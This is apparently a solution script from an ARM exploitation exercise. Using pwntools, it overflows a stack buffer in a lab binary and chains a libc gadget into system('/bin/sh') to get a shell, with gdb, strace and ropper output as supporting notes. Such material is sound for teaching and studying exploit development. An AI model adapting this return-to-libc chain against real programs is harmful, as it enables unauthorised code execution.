#!/usr/bin/python

"""
(gdb) disassemble vulnerable
Dump of assembler code for function vulnerable:
   0x00010460 <+0>:	push	{r7, lr}
...
   0x00010498 <+56>:	pop	{r7, pc}
End of assembler dump.
(gdb) b *0x00010498
Breakpoint 1 at 0x10498: file src/06-system-rop.c, line 11.
(gdb) c
Continuing.

Breakpoint 1, 0x00010498 in vulnerable () at src/06-system-rop.c:11
11	}
(gdb) p &buffer[0]
$1 = 0xfffeef00 'a' <repeats 132 times>, "\251\004\001"
(gdb) i r $sp
sp             0xfffeef80	0xfffeef80
"""

"""
$ qemu-arm -L /usr/arm-linux-gnueabihf/ -strace ./bin/arm/06-system-rop
...
28159 openat(AT_FDCWD,"/lib/libc.so.6",O_RDONLY|O_CLOEXEC) = 3
...
28159 mmap2(NULL,1013128,PROT_EXEC|PROT_READ,MAP_PRIVATE|MAP_DENYWRITE,3,0) = 0xff6a9000
...
"""

"""
$ ropper --nocolor --file /usr/arm-linux-gnueabihf/lib/libc-2.27.so
0x0004c630 (0x0004c631): pop {r0, pc};
"""

import struct
import sys

from pwn import *

context(arch='arm', os='linux', endian='little', word_size=32)

binary_path = './bin/arm/06-system-rop'
libc_path = '/usr/arm-linux-gnueabihf/lib/libc-2.27.so'

saved_pc_addr = 0xfffeef80 + 4
buffer_addr = 0xfffeef00
libc_addr = 0xff6a9000

pop_r0_pc_addr = libc_addr + 0x0004c631

libc = ELF(libc_path)
system_addr = libc_addr + libc.symbols['system']
bin_sh_addr = libc_addr + libc.search('/bin/sh\x00').next()

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (saved_pc_addr - buffer_addr)
payload += p32(pop_r0_pc_addr)
payload += p32(bin_sh_addr)
payload += p32(system_addr)

p.readuntil('> ')
p.write(payload)
p.interactive()
